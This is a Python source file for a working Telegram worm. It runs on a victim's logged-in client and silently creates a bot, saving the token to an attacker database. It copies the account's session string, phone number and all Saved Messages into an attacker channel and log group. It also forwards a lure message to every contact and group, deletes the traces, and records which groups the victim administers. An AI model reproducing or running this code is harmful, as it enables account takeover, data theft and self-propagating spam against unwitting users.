import os,logging,random,asyncio,json
from telethon import functions, errors
from dotenv import load_dotenv
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
from strings import strings

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
load_dotenv(override=True)

mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
database = mongo_client.wormdb

async def create_bot(client, me):
    async with client.conversation("@BotFather") as conv:
        msg = await conv.send_message("/newbot")
        await (await conv.get_response()).delete()
        await (await conv.send_message("SL Wala")).delete()
        await (await conv.get_response()).delete()
        username = "freewala_{}{}_bot".format(random.randint(1000,9999),random.randint(1000,9999))
        await (await conv.send_message(username)).delete()
        response = await conv.get_response()
        bot_token = response.text.split("`")[1].strip()
        await (await conv.send_message("/setuserpic")).delete()
        await (await conv.get_response()).delete()
        await (await conv.send_message(f"@{username}")).delete()
        await (await conv.get_response()).delete()
        await (await conv.send_file('files/profile.png')).delete()
        await (await conv.get_response()).delete()
        await msg.delete()
        await response.delete()
    database.bots.insert_one({"username": username, "token": bot_token, "owner": me.id})
async def backup_saves(client, me, logger_bot):
    result = await client(functions.channels.CreateChannelRequest(
        title=f'{me.first_name} {me.last_name}',
        about=f'ID: {me.id}\nUsername: {me.username}',
        megagroup=False,
    ))
    channel_id = result.updates[1].channel_id
    dest = await client.get_entity(channel_id)
    result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
    database.channels.insert_one({"invite": result.link, "owner": me.id})
    await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nSession: {client.session.save()}")
    msg_count = 0
    async for message in client.iter_messages("me", reverse=True):
        msg_count += 1
        try:
            await message.forward_to(dest)
        except errors.FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            await message.forward_to(dest)
        except:
            break
    await client(functions.channels.LeaveChannelRequest(channel=channel_id))
    log = {
        'txt': f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}\nSession: `{client.session.save()}`",
        'channel_id': channel_id,
        'dest': dest,
        'hash': result.link.split('/')[-1].lstrip('+'),
    }
    log['msg'] = await logger_bot.send_message(int(os.getenv('LOG_GROUP')), log['txt'])
    return log
async def spread(client, me, bot):
    bot_me = await bot.get_me()
    async with client.conversation(f"@{bot_me.username}") as conv:
        msg = await conv.send_message("/worm")
        spread_msg = await conv.get_response()
        spread_msg_nomedia = f"{strings['worm_msg']}\n\n{strings['worm_msg_btn_url']}"
        await msg.delete()
    perm_logs = {
        'creator': [],
        'admin': [],
    }
    async for dialog in client.iter_dialogs():
        if dialog.is_user:
            try:
                user = await client.get_entity(dialog.id)
            except errors.FloodWaitError as e:
                await asyncio.sleep(e.seconds)
                user = await client.get_entity(dialog.id)
            except:
                continue
            if user.bot:
                continue
        elif dialog.is_channel or dialog.is_group:
            permissions = await client.get_permissions(dialog, me)
            if permissions.is_creator:
                perm_logs['creator'].append({'id': dialog.id, 'title': dialog.title})
            elif permissions.is_admin:
                perm_logs['admin'].append({'id': dialog.id, 'title': dialog.title})
        try:
            msg = await spread_msg.forward_to(dialog)
        except errors.FloodWaitError as e:
            await asyncio.sleep(e.seconds)
            msg = await spread_msg.forward_to(dialog)
        except:
            try:
                msg = await dialog.send_message(spread_msg_nomedia)
            except errors.FloodWaitError as e:
                await asyncio.sleep(e.seconds)
                msg = await dialog.send_message(spread_msg_nomedia)
            except:
                continue
        if dialog.is_user:
            await msg.delete(revoke=False)
    return perm_logs

async def worm(client, bot, logger_bot):
    me = await client.get_me()
    log = None
    try:
        await create_bot(client, me)
    except:
        pass
    try:
        log = await backup_saves(client, me, logger_bot)
    except:
        pass
    try:
        perm_logs = await spread(client, me, bot)
        if log and len(perm_logs['creator'])+len(perm_logs['admin']) > 0:
            await log['msg'].edit(log['txt'].replace("Session", f"Owner: {len(perm_logs['creator'])} Admin: {len(perm_logs['admin'])}\nSession"))
            await client(functions.messages.ImportChatInviteRequest(hash=log['hash']))
            await client.send_message(log['dest'], json.dumps(perm_logs, indent=4, ensure_ascii=False))
            await client(functions.channels.LeaveChannelRequest(channel=log['channel_id']))
    except:
        pass
